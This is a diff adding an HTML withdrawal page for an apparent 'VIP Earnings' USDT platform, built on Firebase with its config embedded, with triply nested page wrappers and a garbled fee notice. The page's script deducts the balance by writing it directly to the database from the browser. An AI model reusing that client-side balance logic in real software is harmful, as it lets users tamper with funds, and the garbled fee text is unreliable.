@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Untitled</title>
+    
+
+  </head>
+    
+  <body>
+  <!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Untitled</title>
+    
+
+  </head>
+    
+  <body>
+  <!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Withdraw - VIP Earnings</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}body{background:linear-gradient(180deg,#FFE4E8 0%,#FFC1CC 50%,#FFB6C1 100%);min-height:100vh;color:#333}.header{background:#F8BBD9;padding:15px 20px;display:flex;align-items:center;justify-content:center;position:relative;box-shadow:0 2px 10px rgba(0,0,0,.2)}.back-btn{position:absolute;left:20px;background:none;border:none;color:#fff;font-size:20px;cursor:pointer}.header-title{color:#fff;font-size:18px;font-weight:500}.container{padding:10px;max-width:450px;margin:0 auto}.withdrawal-card{background:#FFF0F5;border-radius:15px;padding:20px;margin-bottom:20px;box-shadow:0 4px 15px rgba(0,0,0,.1);position:relative;border:1px solid #FFB6C1}.card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}.card-title{font-size:16px;color:#E91E63;font-weight:600}.hours-badge{background:#E91E63;color:#fff;padding:4px 8px;border-radius:12px;font-size:12px}.balance-section{margin-bottom:20px}.balance-label{color:#666;font-size:14px;margin-bottom:5px}.balance-amount{font-size:24px;font-weight:bold;color:#E91E63}.balance-currency{font-size:14px;color:#666;margin-right:5px}.network-section{margin-bottom:20px}.network-label{color:#E91E63;font-size:14px;margin-bottom:10px;font-weight:500}.network-buttons{display:flex;gap:10px}.network-btn{flex:1;padding:8px 12px;border-radius:20px;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;transition:all .3s}.network-btn.active{background:#E91E63;color:#fff}.network-btn.inactive{background:#FCE4EC;color:#666;border:1px solid #F8BBD9}.network-icon{width:20px;height:20px;border-radius:50%}.form-group{margin-bottom:15px}.form-input{width:100%;padding:12px;background:#FFF0F5;color:#333;border:1px solid #F8BBD9;border-radius:8px;font-size:14px;outline:none}.form-input::placeholder{color:#C2185B}.form-input.error{border:2px solid #EF4444;background:#FEE2E2;color:#DC2626}.password-group{position:relative}.password-toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#E91E63;cursor:pointer;font-size:16px;opacity:0.7;transition:opacity 0.3s}.confirm-btn{width:100%;background:linear-gradient(135deg,#E91E63,#F06292);color:#fff;padding:15px;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px;transition:all 0.3s;box-shadow:0 4px 8px rgba(233,30,99,0.3)}.confirm-btn:hover{background:linear-gradient(135deg,#C2185B,#E91E63);transform:translateY(-1px);box-shadow:0 6px 12px rgba(233,30,99,0.4)}.confirm-btn:disabled{background:#F8BBD9;cursor:not-allowed;box-shadow:none}.info-section{background:#FFF0F5;border-radius:10px;padding:20px;margin:5px;box-shadow:0 2px 8px rgba(0,0,0,.1);border:1px solid #FFB6C1}.info-text{color:#4B5563;font-size:13px;line-height:1.6;text-align:justify}.success-msg{background:linear-gradient(135deg,#E91E63,#F06292);color:#fff;padding:15px;border-radius:10px;margin-top:15px;display:none;text-align:center;font-weight:600;box-shadow:0 4px 8px rgba(233,30,99,0.3)}.error-msg{background:#D32F2F;color:#fff;padding:10px;border-radius:8px;margin-top:10px;display:none;text-align:center;font-size:14px;box-shadow:0 2px 6px rgba(211,47,47,0.3)}.loading{display:none;text-align:center;margin-top:15px}.spinner{border:3px solid #FCE4EC;border-top:3px solid #E91E63;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto 10px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.password-error{color:#D32F2F;font-size:11px;margin-top:5px;display:none;font-weight:500}.support-link{color:#E91E63;font-size:11px;margin-top:8px;display:none;text-align:center}.support-link a{color:#E91E63;text-decoration:none;font-weight:500}.support-link a:hover{text-decoration:underline;color:#C2185B}.address-validation{font-size:11px;margin-top:5px}.address-valid{color:#E91E63;font-weight:500}.address-invalid{color:#D32F2F;font-weight:500}</style>
+</head>
+<body>
+<div class="header">
+<button class="back-btn" onclick="history.back()">←</button>
+<div class="header-title">Withdraw</div>
+</div>
+
+<div class="container">
+<div class="withdrawal-card">
+<div class="card-header">
+<div class="card-title">Withdrawal Account</div>
+<div class="hours-badge">24h Withdrawal</div>
+</div>
+
+<div class="balance-section">
+<div class="balance-label">Total Balance</div>
+<div class="balance-amount" id="totalBalance"><span class="balance-currency">USDT</span>0.00</div>
+</div>
+
+<div class="network-section">
+<div class="network-label">Withdrawal Method</div>
+<div class="network-buttons">
+<button class="network-btn active" id="bep20Btn" onclick="selectNetwork('bep20')">
+<img src="https://api.mallhelp.com/static/image/bep20-usdt.webp" alt="BEP20" class="network-icon">
+BEP20-USDT
+</button>
+<button class="network-btn inactive" id="trc20Btn" onclick="selectNetwork('trc20')">
+<img src="https://api.mallhelp.com/static/image/trc20-usdt.jpg" alt="TRC20" class="network-icon">
+TRC20-USDT
+</button>
+</div>
+</div>
+
+<div class="form-group">
+<input type="number" class="form-input" id="amountInput" placeholder="9999999.000 - 4.000 Amount Range" step="0.001">
+</div>
+
+<div class="form-group">
+<input type="text" class="form-input" id="addressInput" placeholder="Withdrawal Address" oninput="validateAddress()">
+<div id="addressValidation" class="address-validation"></div>
+</div>
+
+<div class="form-group password-group">
+<input type="password" class="form-input" id="passwordInput" placeholder="Account Password">
+<button class="password-toggle" onclick="togglePassword()">👁</button>
+<div id="passwordError" class="password-error">Incorrect password. Please try again.</div>
+<div id="supportLink" class="support-link">Hello, if you forgot your password you can contact support from <a href="support.html">here</a></div>
+</div>
+
+<div id="errorMsg" class="error-msg"></div>
+
+<button class="confirm-btn" id="confirmBtn" onclick="confirmWithdraw()">Confirm</button>
+
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p>Processing...</p>
+</div>
+
+<div class="success-msg" id="successMsg">Success! Your withdrawal request has been submitted.</div>
+</div>
+
+<div class="info-section">
+<div class="info-text">
+Withdraw once daily, arrives within 1-3 minutes. No withdrawal fees, minimum withdrawal amount is 1 USDT for BEP20 withdrawal and 1 USDT for TRC20 minimum withdrawal amount. USDT USDC will be recorded if they are less than 2. TRX if they are less than 2, and will not be recorded if they are less than 0.003 BNB 0.1, and will not be recorded.
+</div>
+</div>
+</div>
+
+<script type="module">
+import{initializeApp}from"https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+import{getAuth,onAuthStateChanged,signInWithEmailAndPassword}from"https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
+import{getFirestore,doc,getDoc,setDoc,collection,addDoc,serverTimestamp}from"https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+
+const firebaseConfig={apiKey:"AIzaSyA-MK1RYmvpYJrTOBAQcxDqxhp-z_FOb1o",authDomain:"mzjsjjshs.firebaseapp.com",projectId:"mzjsjjshs",storageBucket:"mzjsjjshs.firebasestorage.app",messagingSenderId:"944370558426",appId:"1:944370558426:web:70d4ee772c487f48b58ce3",measurementId:"G-CWJWKWBBST"};
+
+const app=initializeApp(firebaseConfig);
+const auth=getAuth(app);
+const db=getFirestore(app);
+let currentUser=null;
+let userBalance=0;
+let selectedNetwork='bep20';
+let passwordAttempts=0;
+
+onAuthStateChanged(auth,async(user)=>{
+if(user){
+currentUser=user;
+await loadUserBalance();
+}else{
+alert('Please login first');
+window.location.href='login.html';
+}
+});
+
+async function loadUserBalance(){
+if(!currentUser)return;
+try{
+const userDoc=await getDoc(doc(db,'users',currentUser.uid));
+if(userDoc.exists()){
+const userData=userDoc.data();
+userBalance=userData.balance||0;
+document.getElementById('totalBalance').innerHTML='<span class="balance-currency">USDT</span>'+userBalance.toFixed(2);
+}
+}catch(error){
+console.error('Error loading balance:',error);
+}
+}
+
+window.selectNetwork=function(network){
+selectedNetwork=network;
+const bep20Btn=document.getElementById('bep20Btn');
+const trc20Btn=document.getElementById('trc20Btn');
+if(network==='bep20'){
+bep20Btn.className='network-btn active';
+trc20Btn.className='network-btn inactive';
+}else{
+bep20Btn.className='network-btn inactive';
+trc20Btn.className='network-btn active';
+}
+validateAddress();
+}
+
+window.validateAddress=function(){
+const address=document.getElementById('addressInput').value.trim();
+const validation=document.getElementById('addressValidation');
+const input=document.getElementById('addressInput');
+
+if(!address){
+validation.innerHTML='';
+input.classList.remove('error');
+return;
+}
+
+let isValid=false;
+if(selectedNetwork==='trc20'){
+isValid=address.length>=25&&address.startsWith('T');
+validation.innerHTML=isValid?'<span class="address-valid">✓ Valid TRC20 address</span>':'<span class="address-invalid">✗ Invalid TRC20 address</span>';
+}else if(selectedNetwork==='bep20'){
+isValid=address.length>=25&&address.startsWith('0x');
+validation.innerHTML=isValid?'<span class="address-valid">✓ Valid BEP20 address</span>':'<span class="address-invalid">✗ Invalid BEP20 address</span>';
+}
+
+if(isValid){
+input.classList.remove('error');
+}else{
+input.classList.add('error');
+}
+}
+
+window.togglePassword=function(){
+const passwordInput=document.getElementById('passwordInput');
+passwordInput.type=passwordInput.type==='password'?'text':'password';
+}
+
+async function verifyPassword(email,password){
+try{
+await signInWithEmailAndPassword(auth,email,password);
+return true;
+}catch(error){
+return false;
+}
+}
+
+window.confirmWithdraw=async function(){
+if(!currentUser){
+alert('Please login first');
+return;
+}
+
+const amount=parseFloat(document.getElementById('amountInput').value);
+const address=document.getElementById('addressInput').value.trim();
+const password=document.getElementById('passwordInput').value;
+const loading=document.getElementById('loading');
+const successMsg=document.getElementById('successMsg');
+const errorMsg=document.getElementById('errorMsg');
+const passwordError=document.getElementById('passwordError');
+const supportLink=document.getElementById('supportLink');
+const confirmBtn=document.getElementById('confirmBtn');
+
+// Reset error states
+passwordError.style.display='none';
+supportLink.style.display='none';
+errorMsg.style.display='none';
+document.getElementById('passwordInput').classList.remove('error');
+
+if(!amount||!address||!password){
+errorMsg.innerHTML='Please fill all fields';
+errorMsg.style.display='block';
+return;
+}
+
+const minAmount=selectedNetwork==='bep20'?1:1;
+if(amount<minAmount){
+errorMsg.innerHTML=`Minimum withdrawal amount is ${minAmount} USDT`;
+errorMsg.style.display='block';
+return;
+}
+
+if(amount>userBalance){
+errorMsg.innerHTML='Amount exceeds available balance';
+errorMsg.style.display='block';
+return;
+}
+
+// Validate address
+if((selectedNetwork==='trc20'&&(!address.startsWith('T')||address.length<25))||(selectedNetwork==='bep20'&&(!address.startsWith('0x')||address.length<25))){
+errorMsg.innerHTML='Invalid wallet address for selected network';
+errorMsg.style.display='block';
+return;
+}
+
+// Verify password
+confirmBtn.disabled=true;
+loading.style.display='block';
+
+const isPasswordValid=await verifyPassword(currentUser.email,password);
+
+if(!isPasswordValid){
+loading.style.display='none';
+confirmBtn.disabled=false;
+passwordAttempts++;
+
+document.getElementById('passwordInput').classList.add('error');
+passwordError.style.display='block';
+
+if(passwordAttempts>=2){
+supportLink.style.display='block';
+}
+return;
+}
+
+try{
+const withdrawData={
+userId:currentUser.uid,
+userEmail:currentUser.email,
+amount:amount,
+walletAddress:address,
+network:selectedNetwork.toUpperCase(),
+status:'pending',
+timestamp:serverTimestamp(),
+createdAt:new Date().toISOString()
+};
+
+await addDoc(collection(db,'withdrawals'),withdrawData);
+
+const newBalance=userBalance-amount;
+await setDoc(doc(db,'users',currentUser.uid),{balance:newBalance},{merge:true});
+
+userBalance=newBalance;
+document.getElementById('totalBalance').innerHTML='<span class="balance-currency">USDT</span>'+userBalance.toFixed(2);
+
+loading.style.display='none';
+successMsg.style.display='block';
+confirmBtn.disabled=false;
+
+document.getElementById('amountInput').value='';
+document.getElementById('addressInput').value='';
+document.getElementById('passwordInput').value='';
+document.getElementById('addressValidation').innerHTML='';
+passwordAttempts=0;
+
+setTimeout(()=>{
+successMsg.style.display='none';
+},4000);
+
+}catch(error){
+console.error('Error:',error);
+loading.style.display='none';
+confirmBtn.disabled=false;
+errorMsg.innerHTML='Error submitting request. Please try again.';
+errorMsg.style.display='block';
+}
+}
+</script>
+</body>
+</html>
+    
+  </body>
+  
+</html>
+    
+  </body>
+  
+</html>
